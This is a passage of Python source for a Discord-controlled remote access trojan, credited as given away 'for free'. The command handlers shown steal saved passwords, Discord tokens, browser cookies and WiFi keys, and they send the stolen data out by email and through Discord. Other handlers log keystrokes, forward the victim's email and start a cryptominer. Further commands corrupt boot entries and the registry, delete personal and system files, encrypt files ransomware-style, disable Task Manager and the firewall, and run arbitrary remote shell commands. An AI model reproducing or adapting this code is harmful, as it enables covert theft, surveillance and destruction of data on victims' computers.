                f"Startup: {startup_status}\n"
                f"Type `{Config.PREFIX}help`\n"
                f"📧 Email Forwarding: Running"
            ),
            color=discord.Color.green()
        )
        await channel.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await send_embed(ctx, "Command Not Found", f"Use `{Config.PREFIX}help`", discord.Color.red())
    elif isinstance(error, commands.CheckFailure):
        pass
    else:
        await send_embed(ctx, "Error", f"```{str(error)}```", discord.Color.red())

# ========== HELP COMMAND ==========
@bot.command(name='help')
async def cmd_help(ctx):
    if ctx.author.id not in Config.WHITELISTED:
        return
    
    embed = discord.Embed(
        title="📋 Commands",
        description="All available commands to control the target PC.",
        color=discord.Color.purple()
    )
    
    categories = {
        "🔧 Config": [
            f"**Prefix:** `{Config.PREFIX}`",
            f"**Whitelisted:** <@{Config.WHITELISTED}>",
            f"**Main Channel:** <#{Config.MAIN_CHANNEL}>"
        ],
        "💻 System Info": [
            "`info` - Advanced system information",
            "`sysinfo` - Quick system summary",
            "`systeminfo` - Full hardware info",
            "`installedapps` - List all installed programs",
            "`startupapps` - List startup applications",
        ],
        "🔑 Stealers": [
            "`passwords` - Grab saved passwords (sends to email)",
            "`tokens` - Grab Discord tokens (sends to email)",
            "`cookies` - Grab Chrome cookies",
            "`wifipass` - Get saved WiFi passwords",
        ],
        "⌨️ Keylogger": [
            "`keylog` - Start keylogger",
            "`stopkeylog` - Stop keylogger and get logs",
        ],
        "📧 Email Forwarding": [
            "`forwardemails` - Start forwarding emails to Discord",
            "`stopforward` - Stop forwarding emails",
        ],
        "⛏️ Mining/Resources": [
            "`mining` - Start crypto mining",
            "`stopmine` - Stop mining",
            "`cpuburn` - Max out CPU usage",
            "`ramburn` - Use up RAM",
            "`diskburns` - Create large temp files",
        ],
        "💀 Destructive": [
            "`lock` - Lock PC",
            "`crash` - Blue screen PC",
            "`filescramble` - Rename all files randomly",
            "`filedestroy` - Delete all personal files",
            "`fileransom` - Encrypt all files",
            "`virus` - Fake virus messages",
            "`killprocess` - Kill a process",
            "`disabletaskmgr` - Disable Task Manager",
            "`enabletaskmgr` - Enable Task Manager",
            "`destroyboot` - Corrupt boot files ⚠️",
            "`corruptreg` - Corrupt registry ⚠️",
            "`deletesys` - Delete system files ⚠️",
            "`disablefirewall` - Disable firewall",
            "`enablefirewall` - Enable firewall",
        ],
        "💬 Messages": [
            "`voice [message]` - Text-to-speech",
            "`msgbox [message]` - Message box popup",
            "`rickroll` - Open Rickroll",
            "`alarm [seconds]` - Sound alarm",
            "`notify [message]` - Send Windows notification",
        ],
        "🎮 Control": [
            "`screenshot [name]` - Take screenshot",
            "`screenshare` - Start screen sharing",
            "`stopscreenshare` - Stop screen sharing",
            "`open <app>` - Open application",
            "`close <app>` - Close application",
            "`listapps [limit]` - List running apps",
            "`cmd [command]` - Run CMD command",
            "`powershell [command]` - Run PowerShell",
            "`webcam` - Take webcam photo",
        ],
        "🎉 Fun/Annoying": [
            "`jumpscare` - Trigger jumpscare",
            "`fakebsod` - Show fake BSOD",
            "`mousemove` - Randomly move mouse",
            "`reversescreen` - Flip screen upside down",
            "`opensite` - Open random website",
        ],
        "🖱️ Mouse & Keyboard": [
            "`click [left|right|middle]` - Mouse click",
            "`press <keys>` - Press keys",
            "`type [text]` - Type text",
            "`move [x] [y]` - Move mouse",
            "`scroll [amount]` - Scroll",
            "`doubleclick` - Double click",
            "`rightclick` - Right click",
            "`getpos` - Get mouse position",
        ],
        "⚡ Power": [
            "`shutdown [delay]` - Shutdown PC",
            "`restart [delay]` - Restart PC",
            "`sleep` - Put PC to sleep",
            "`logoff` - Log off user",
        ],
        "🎵 Media": [
            "`playpause` - Play/Pause",
            "`nexttrack` - Next track",
            "`prevtrack` - Previous track",
            "`volumeup` - Volume up",
            "`volumedown` - Volume down",
            "`mute` - Mute volume",
        ],
        "📁 Files": [
            "`listfiles [directory]` - List files",
            "`download [filepath]` - Download file",
            "`deletefile [filepath]` - Delete file",
            "`createfile [name] [content]` - Create file",
        ],
        "🤖 Bot": [
            "`startup` - Check startup status",
            "`addstartup` - Add to startup",
            "`clearchat [amount]` - Delete bot messages",
            "`exit` - Close RAT",
        ],
        "🎀 Credits": [
            "-# Thanks to **Neek**, this product is brought to you for free! 🎀"
        ]
    }
    
    for category, commands in categories.items():
        embed.add_field(name=category, value="\n".join(commands), inline=False)
    
    await ctx.send(embed=embed)

# ========== COMMANDS ==========

# Startup
@bot.command(name='startup')
@is_authorized()
async def cmd_startup(ctx):
    try:
        if is_in_startup():
            await send_embed(ctx, "✅ Startup Status", "RAT is in startup registry!", discord.Color.green())
        else:
            await send_embed(ctx, "❌ Startup Status", "RAT is NOT in startup. Use `addstartup`", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='addstartup')
@is_authorized()
async def cmd_addstartup(ctx):
    try:
        if add_to_startup():
            await send_embed(ctx, "✅ Startup Added", "RAT will run when PC boots!", discord.Color.green())
        else:
            await send_embed(ctx, "❌ Failed", "Try running as admin.", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# System Info
@bot.command(name='info')
@is_authorized()
async def cmd_info(ctx):
    try:
        embed = discord.Embed(title="Collecting system information...", color=discord.Color.blue())
        await ctx.send(embed=embed)
        
        display_name = get_displayname()
        hwid = get_hwid()
        cpu_info = get_cpuinfo()
        gpu_info = get_gpuinfo()
        ram_info = get_raminfo()
        disks = get_disks()
        ip_info = get_ipinfo()
        mac_address = get_macaddress()
        wifi_profiles = get_wifipasswords()

        embed = discord.Embed(title="🖥️ System Information", color=discord.Color.blue())
        embed.add_field(name="Display Name", value=f"```{display_name}```", inline=False)
        embed.add_field(name="Hardware ID", value=f"```{hwid}```", inline=False)
        embed.add_field(name="CPU", value=f"```{cpu_info}```", inline=False)
        embed.add_field(name="GPU", value=f"```{gpu_info}```", inline=False)
        
        memory = psutil.virtual_memory()
        cpu_percent = psutil.cpu_percent(interval=1)
        embed.add_field(name="RAM", value=f"```{ram_info} ({memory.percent}% used)```", inline=False)
        embed.add_field(name="CPU Usage", value=f"```{cpu_percent}%```", inline=True)
        
        disk_str = ""
        for disk in disks[:3]:
            disk_str += f"{disk['drive']}: {disk['free']}GB free / {disk['total']}GB total ({disk['percent']}% used)\n"
        embed.add_field(name="Disks", value=f"```{disk_str}```", inline=False)
        
        embed.add_field(name="Public IP", value=f"```{ip_info['ip']}```", inline=False)
        embed.add_field(name="Location", value=f"```{ip_info['city']}, {ip_info['region']}, {ip_info['country']}```", inline=False)
        embed.add_field(name="ISP", value=f"```{ip_info['isp']}```", inline=False)
        embed.add_field(name="MAC Address", value=f"```{mac_address}```", inline=False)
        embed.add_field(name="Local IP", value=f"```{get_local_ip()}```", inline=True)
        embed.add_field(name="OS", value=f"```{platform.system()} {platform.release()}```", inline=True)
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        embed.add_field(name="Boot Time", value=f"```{boot_time.strftime('%Y-%m-%d %H:%M:%S')}```", inline=True)
        embed.add_field(name="Processes", value=f"```{len(psutil.pids())}```", inline=True)
        
        if wifi_profiles:
            wifi_str = ""
            for wifi in wifi_profiles[:5]:
                wifi_str += f"{wifi['name']}: {wifi['password']}\n"
            embed.add_field(name="WiFi Profiles", value=f"```{wifi_str}```", inline=False)
            if len(wifi_profiles) > 5:
                embed.add_field(name="More WiFi", value=f"```...and {len(wifi_profiles)-5} more profiles```", inline=False)

        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Info Error", str(e), discord.Color.red())

@bot.command(name='sysinfo')
@is_authorized()
async def cmd_sysinfo(ctx):
    try:
        info = get_ipinfo()
        embed = discord.Embed(title="⚡ Quick System Info", color=discord.Color.blue())
        embed.add_field(name="User", value=get_displayname(), inline=True)
        embed.add_field(name="OS", value=f"{platform.system()} {platform.release()}", inline=True)
        embed.add_field(name="CPU", value=f"{psutil.cpu_percent()}%", inline=True)
        embed.add_field(name="RAM", value=f"{psutil.virtual_memory().percent}%", inline=True)
        embed.add_field(name="IP", value=info['ip'], inline=True)
        embed.add_field(name="Host", value=platform.node(), inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='systeminfo')
@is_authorized()
async def cmd_systeminfo(ctx):
    try:
        embed = discord.Embed(title="💻 Full System Information", color=discord.Color.blue())
        embed.add_field(name="User", value=get_displayname(), inline=True)
        embed.add_field(name="Hostname", value=platform.node(), inline=True)
        embed.add_field(name="OS", value=f"{platform.system()} {platform.release()}", inline=True)
        embed.add_field(name="CPU", value=get_cpuinfo(), inline=False)
        embed.add_field(name="GPU", value=get_gpuinfo(), inline=False)
        embed.add_field(name="RAM Total", value=get_raminfo(), inline=True)
        embed.add_field(name="RAM Used", value=f"{psutil.virtual_memory().percent}%", inline=True)
        embed.add_field(name="HWID", value=get_hwid(), inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='installedapps')
@is_authorized()
async def cmd_installedapps(ctx):
    try:
        await send_embed(ctx, "📦 Installed Apps", "Scanning...", discord.Color.blue())
        apps = get_installed_apps()
        if apps:
            output = "=== INSTALLED APPLICATIONS ===\n\n"
            for app in apps[:100]:
                output += f"{app}\n"
            if len(apps) > 100:
                output += f"\n...and {len(apps)-100} more"
            filename = f"installed_apps_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(output)
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
        else:
            await send_embed(ctx, "Installed Apps", "No installed apps found.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='startupapps')
@is_authorized()
async def cmd_startupapps(ctx):
    try:
        apps = get_startup_apps()
        if apps:
            output = "=== STARTUP APPLICATIONS ===\n\n"
            for app in apps:
                output += f"{app}\n"
            filename = f"startup_apps_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(output)
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
        else:
            await send_embed(ctx, "Startup Apps", "No startup apps found.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== STEALER COMMANDS ==========

@bot.command(name='passwords')
@is_authorized()
async def cmd_passwords(ctx):
    try:
        await send_embed(ctx, "🔑 Password Stealer", "Searching for saved passwords...", discord.Color.gold())
        
        all_passwords = get_all_passwords()
        
        if all_passwords:
            output = "=== SAVED PASSWORDS ===\n\n"
            for p in all_passwords:
                output += f"URL: {p['url']}\n"
                output += f"Username: {p['username']}\n"
                output += f"Password: {p['password']}\n"
                output += "-" * 40 + "\n\n"
            
            filename = f"passwords_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(output)
            
            # Send to email
            send_stolen_data("PASSWORDS", output)
            
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
            
            embed = discord.Embed(
                title="🔑 Passwords Found!",
                description=f"Found **{len(all_passwords)}** saved passwords.\n✅ Data sent to email!",
                color=discord.Color.gold()
            )
            await ctx.send(embed=embed)
        else:
            await send_embed(ctx, "🔑 Password Stealer", "No saved passwords found.", discord.Color.orange())
            
    except Exception as e:
        await send_embed(ctx, "Password Error", str(e), discord.Color.red())

@bot.command(name='tokens')
@is_authorized()
async def cmd_tokens(ctx):
    try:
        await send_embed(ctx, "🔑 Token Grabber", "Searching for Discord tokens...", discord.Color.gold())
        
        found_tokens = []
        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
        paths = [
            os.path.expandvars(r'%APPDATA%\Discord\Local Storage\leveldb'),
            os.path.expandvars(r'%APPDATA%\DiscordCanary\Local Storage\leveldb'),
            os.path.expandvars(r'%APPDATA%\DiscordPTB\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb'),
        ]
        for path in paths:
            if os.path.exists(path):
                try:
                    for file in os.listdir(path):
                        if file.endswith('.log') or file.endswith('.ldb'):
                            file_path = os.path.join(path, file)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    matches = re.findall(token_pattern, content)
                                    for match in matches:
                                        if match not in found_tokens:
                                            found_tokens.append(match)
                            except:
                                pass
                except:
                    pass
        
        if found_tokens:
            output = "=== DISCORD TOKENS ===\n\n"
            for token in found_tokens:
                output += token + "\n"
            
            # Send to email
            send_stolen_data("DISCORD_TOKENS", output)
            
            embed = discord.Embed(
                title="🔑 Tokens Found!",
                description=f"Found **{len(found_tokens)}** Discord tokens.\n✅ Data sent to email!",
                color=discord.Color.gold()
            )
            await ctx.send(embed=embed)
        else:
            await send_embed(ctx, "🔑 Token Grabber", "No Discord tokens found.", discord.Color.orange())
            
    except Exception as e:
        await send_embed(ctx, "Token Error", str(e), discord.Color.red())

@bot.command(name='cookies')
@is_authorized()
async def cmd_cookies(ctx):
    try:
        await send_embed(ctx, "🍪 Cookie Stealer", "Searching for cookies...", discord.Color.blue())
        
        cookies = get_chrome_cookies()
        
        if cookies:
            output = "=== COOKIES FOUND ===\n\n"
            for c in cookies[:50]:
                output += f"Host: {c['host']}\n"
                output += f"Name: {c['name']}\n"
                output += f"Value: {c['value']}\n"
                output += "-" * 40 + "\n\n"
            
            filename = f"cookies_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(output)
            
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
            
            embed = discord.Embed(
                title="🍪 Cookies Found!",
                description=f"Found **{len(cookies)}** cookies from Chrome.",
                color=discord.Color.blue()
            )
            await ctx.send(embed=embed)
        else:
            await send_embed(ctx, "🍪 Cookie Stealer", "No cookies found.", discord.Color.orange())
            
    except Exception as e:
        await send_embed(ctx, "Cookie Error", str(e), discord.Color.red())

@bot.command(name='wifipass')
@is_authorized()
async def cmd_wifipass(ctx):
    try:
        await send_embed(ctx, "📶 WiFi Passwords", "Retrieving saved WiFi passwords...", discord.Color.blue())
        profiles = get_wifipasswords()
        if profiles:
            output = "=== SAVED WIFI PASSWORDS ===\n\n"
            for p in profiles:
                output += f"Network: {p['name']}\n"
                output += f"Password: {p['password']}\n"
                output += "-" * 40 + "\n\n"
            filename = f"wifipass_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(output)
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
            embed = discord.Embed(
                title="📶 WiFi Passwords Found!",
                description=f"Found **{len(profiles)}** saved WiFi networks.",
                color=discord.Color.blue()
            )
            await ctx.send(embed=embed)
        else:
            await send_embed(ctx, "📶 WiFi Passwords", "No saved WiFi passwords found.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "WiFi Error", str(e), discord.Color.red())

# ========== KEYLOGGER COMMANDS ==========

@bot.command(name='keylog')
@is_authorized()
async def cmd_keylog(ctx):
    global KEYLOGGING
    try:
        if KEYLOGGING:
            await send_embed(ctx, "⌨️ Keylogger", "Already running!", discord.Color.orange())
            return
        start_keylogger()
        await send_embed(ctx, "⌨️ Keylogger Started", "Recording keystrokes. Use `stopkeylog` to stop.", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Keylogger Error", str(e), discord.Color.red())

@bot.command(name='stopkeylog')
@is_authorized()
async def cmd_stopkeylog(ctx):
    global KEYLOGGING
    try:
        if not KEYLOGGING:
            await send_embed(ctx, "⌨️ Keylogger", "Not running!", discord.Color.orange())
            return
        log_data = stop_keylogger()
        if log_data:
            filename = f"keylog_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=== KEYLOGGER LOG ===\n\n")
                f.write(log_data)
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
            embed = discord.Embed(
                title="⌨️ Keylogger Stopped",
                description=f"Captured **{len(log_data)}** keystrokes.",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed)
        else:
            await send_embed(ctx, "⌨️ Keylogger", "No keystrokes logged.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Keylogger Error", str(e), discord.Color.red())

# ========== EMAIL FORWARDING COMMANDS ==========

@bot.command(name='forwardemails')
@is_authorized()
async def cmd_forwardemails(ctx):
    global email_monitor_running
    if email_monitor_running:
        await send_embed(ctx, "📧 Email Forwarding", "Already running!", discord.Color.orange())
        return
    email_monitor_running = True
    threading.Thread(target=start_email_monitor, daemon=True).start()
    await send_embed(ctx, "📧 Email Forwarding Started", "All emails will be forwarded to Discord!", discord.Color.green())

@bot.command(name='stopforward')
@is_authorized()
async def cmd_stopforward(ctx):
    global email_monitor_running
    email_monitor_running = False
    await send_embed(ctx, "📧 Email Forwarding Stopped", "No longer forwarding emails.", discord.Color.red())

# ========== MINING COMMANDS ==========

@bot.command(name='mining')
@is_authorized()
async def cmd_mining(ctx):
    try:
        await send_embed(ctx, "⛏️ Mining Started", "Opening crypto miner in browser...", discord.Color.gold())
        browser_name, browser_path = get_default_browser()
        mining_urls = [
            'https://cryptojacking.com/miner.html',
            'https://coinhive.com/demo',
        ]
        url = random.choice(mining_urls)
        if browser_name == 'unknown':
            webbrowser.open(url)
        else:
            subprocess.Popen([browser_path, url], creationflags=0x08000000)
        await send_embed(ctx, "⛏️ Mining Active", "Miner running in browser! Close tab to stop.", discord.Color.gold())
    except Exception as e:
        await send_embed(ctx, "Mining Error", str(e), discord.Color.red())

@bot.command(name='cpuburn')
@is_authorized()
async def cmd_cpuburn(ctx):
    try:
        await send_embed(ctx, "🔥 CPU Burn", "Maxing out CPU...", discord.Color.red())
        cpu_burn()
        await send_embed(ctx, "🔥 CPU Burn Complete", f"CPU at 100% on all {psutil.cpu_count()} cores!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='ramburn')
@is_authorized()
async def cmd_ramburn(ctx):
    try:
        await send_embed(ctx, "💾 RAM Burn", "Using up RAM...", discord.Color.red())
        chunks = ram_burn()
        await send_embed(ctx, "💾 RAM Burn Complete", f"Used **{chunks}** chunks of 100MB RAM!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='diskburns')
@is_authorized()
async def cmd_diskburn(ctx):
    try:
        await send_embed(ctx, "💿 Disk Burn", "Creating large temp files...", discord.Color.red())
        files = disk_burn()
        await send_embed(ctx, "💿 Disk Burn Complete", f"Created **{files}** large temp files!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== DESTRUCTIVE COMMANDS ==========

@bot.command(name='lock')
@is_authorized()
async def cmd_lock(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await send_embed(ctx, "🔒 PC Locked", "Workstation locked.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='crash')
@is_authorized()
async def cmd_crash(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await send_embed(ctx, "💀 BSOD Initiated", "Blue screen triggered!", discord.Color.dark_red())
    except:
        await send_embed(ctx, "BSOD Failed", "Could not trigger blue screen.", discord.Color.red())

@bot.command(name='disabletaskmgr')
@is_authorized()
async def cmd_disabletaskmgr(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        await send_embed(ctx, "Task Manager Disabled", "Task Manager disabled!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='enabletaskmgr')
@is_authorized()
async def cmd_enabletaskmgr(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        await send_embed(ctx, "Task Manager Enabled", "Task Manager enabled!", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='disablefirewall')
@is_authorized()
async def cmd_disablefirewall(ctx):
    try:
        if disable_firewall():
            await send_embed(ctx, "🔥 Firewall Disabled", "Windows Firewall disabled!", discord.Color.red())
        else:
            await send_embed(ctx, "Error", "Failed to disable firewall", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='enablefirewall')
@is_authorized()
async def cmd_enablefirewall(ctx):
    try:
        if enable_firewall():
            await send_embed(ctx, "🔥 Firewall Enabled", "Windows Firewall enabled!", discord.Color.green())
        else:
            await send_embed(ctx, "Error", "Failed to enable firewall", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='destroyboot')
@is_authorized()
async def cmd_destroyboot(ctx):
    await send_embed(ctx, "⚠️ WARNING", "Corrupt boot files! Type 'YES' to confirm", discord.Color.dark_red())
    def check(m):
        return m.author == ctx.author and m.content == "YES"
    try:
        await bot.wait_for('message', timeout=30, check=check)
        if os.name == "nt":
            os.system('bcdedit /export C:\\boot_backup.bak')
            os.system('bcdedit /deletevalue {default} path')
            await send_embed(ctx, "💀 Boot Corrupted", "System will not boot on restart!", discord.Color.dark_red())
        else:
            await send_embed(ctx, "Error", "Only works on Windows!", discord.Color.red())
    except asyncio.TimeoutError:
        await send_embed(ctx, "Cancelled", "Command timed out", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='corruptreg')
@is_authorized()
async def cmd_corruptreg(ctx):
    await send_embed(ctx, "⚠️ DANGER", "Corrupt registry! Type 'YES' to confirm", discord.Color.dark_red())
    def check(m):
        return m.author == ctx.author and m.content == "YES"
    try:
        await bot.wait_for('message', timeout=30, check=check)
        if corrupt_registry():
            await send_embed(ctx, "💀 Registry Corrupted", "Registry corrupted!", discord.Color.dark_red())
        else:
            await send_embed(ctx, "Error", "Failed", discord.Color.red())
    except asyncio.TimeoutError:
        await send_embed(ctx, "Cancelled", "Timed out", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='deletesys')
@is_authorized()
async def cmd_deletesys(ctx):
    await send_embed(ctx, "⚠️ DANGER", "Delete system files! Type 'YES' to confirm", discord.Color.dark_red())
    def check(m):
        return m.author == ctx.author and m.content == "YES"
    try:
        await bot.wait_for('message', timeout=30, check=check)
        deleted = delete_system_files()
        await send_embed(ctx, "💀 System Files Deleted", f"Deleted **{deleted}** critical system files!", discord.Color.dark_red())
    except asyncio.TimeoutError:
        await send_embed(ctx, "Cancelled", "Timed out", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='filescramble')
@is_authorized()
async def cmd_filescramble(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        scrambled = 0
        await send_embed(ctx, "File Scramble Started", "Renaming files...", discord.Color.purple())
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            old_path = os.path.join(root, file)
                            ext = os.path.splitext(file)[1]
                            new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ext
                            new_path = os.path.join(root, new_name)
                            os.rename(old_path, new_path)
                            scrambled += 1
                        except:
                            pass
        await send_embed(ctx, "File Scramble Complete", f"Scrambled **{scrambled}** files!", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='filedestroy')
@is_authorized()
async def cmd_filedestroy(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        deleted = 0
        await send_embed(ctx, "File Destruction Started", "Deleting files...", discord.Color.dark_red())
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            os.remove(file_path)
                            deleted += 1
                        except:
                            pass
        await send_embed(ctx, "File Destruction Complete", f"Deleted **{deleted}** files!", discord.Color.dark_red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='fileransom')
@is_authorized()
async def cmd_fileransom(ctx):
    try:
        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
        encrypted = 0
        await send_embed(ctx, "Ransomware Started", "Encrypting files...", discord.Color.dark_purple())
        for folder in folders:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            encrypted_data = base64.b64encode(data)
                            with open(file_path + '.ENCRYPTED', 'wb') as f:
                                f.write(encrypted_data)
                            os.remove(file_path)
                            encrypted += 1
                        except:
                            pass
        await send_embed(ctx, "Ransomware Complete", f"Encrypted **{encrypted}** files!", discord.Color.dark_purple())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='virus')
@is_authorized()
async def cmd_virus(ctx):
    try:
        await send_embed(ctx, "Virus Alert", "Displaying fake virus messages", discord.Color.red())
        messages = [
            "WARNING! This device is filled with viruses!",
            "Pay $234,324,214 in crypto within 24 hours!",
            "All your files will be deleted if you don't pay!",
            "You have been hacked! Your data is encrypted!",
            "Sending all your files to the dark web..."
        ]
        for msg in messages:
            subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{msg}')" """, shell=True, capture_output=True, text=True)
            time.sleep(1)
    except Exception as e:
        await send_embed(ctx, "Virus Error", str(e), discord.Color.red())

@bot.command(name='killprocess')
@is_authorized()
async def cmd_killprocess(ctx, *, process_name: str):
    try:
        killed = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if process_name.lower() in proc.info['name'].lower():
                proc.kill()
                killed += 1
        if killed > 0:
            await send_embed(ctx, "Process Killed", f"Killed **{killed}** process(es) matching **{process_name}**", discord.Color.red())
        else:
            await send_embed(ctx, "Process Not Found", f"No process found matching **{process_name}**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== MESSAGE COMMANDS ==========

@bot.command(name='voice')
@is_authorized()
async def cmd_voice(ctx, *, message: str):
    try:
        engine = pyttsx3.init()
        engine.say(message)
        engine.runAndWait()
        await send_embed(ctx, "Voice Message", f"Said: **{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Voice Error", str(e), discord.Color.red())

@bot.command(name='msgbox')
@is_authorized()
async def cmd_msgbox(ctx, *, message: str):
    try:
        subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{message}')" """, shell=True, capture_output=True, text=True)
        await send_embed(ctx, "Message Box", f"Displayed: **{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Message Error", str(e), discord.Color.red())

@bot.command(name='notify')
@is_authorized()
async def cmd_notify(ctx, *, message: str):
    try:
        subprocess.run(f'powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Process -Id $pid).Path); $notify.BalloonTipText = \'{message}\'; $notify.BalloonTipTitle = \'System Alert\'; $notify.Visible = $true; $notify.ShowBalloonTip(5000)"', shell=True)
        await send_embed(ctx, "Notification Sent", f"**{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Notify Error", str(e), discord.Color.red())

@bot.command(name='alarm')
@is_authorized()
async def cmd_alarm(ctx, duration: int = 5):
    try:
        await send_embed(ctx, "🔔 Alarm", f"Ringing for {duration} seconds", discord.Color.orange())
        for i in range(duration):
            ctypes.windll.kernel32.Beep(1000, 500)
            await asyncio.sleep(1)
        await send_embed(ctx, "Alarm Done", "Alarm finished!", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Alarm Error", str(e), discord.Color.red())

@bot.command(name='rickroll')
@is_authorized()
async def cmd_rickroll(ctx):
    try:
        browser_name, browser_path = get_default_browser()
        rickrolls = [
            'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
            'https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=43s',
        ]
        url = random.choice(rickrolls)
        if browser_name == 'unknown':
            webbrowser.open(url)
        else:
            subprocess.Popen([browser_path, url], creationflags=0x08000000)
        await send_embed(ctx, "🎵 Rickroll Activated", "Never gonna give you up!", discord.Color.gold())
        try:
            engine = pyttsx3.init()
            engine.say("Never gonna give you up, never gonna let you down!")
            engine.runAndWait()
        except:
            pass
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== CONTROL COMMANDS ==========

@bot.command(name='screenshot')
@is_authorized()
async def cmd_screenshot(ctx, name: Optional[str] = None):
    try:
        filename = name if name else f"screenshot_{int(time.time())}.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
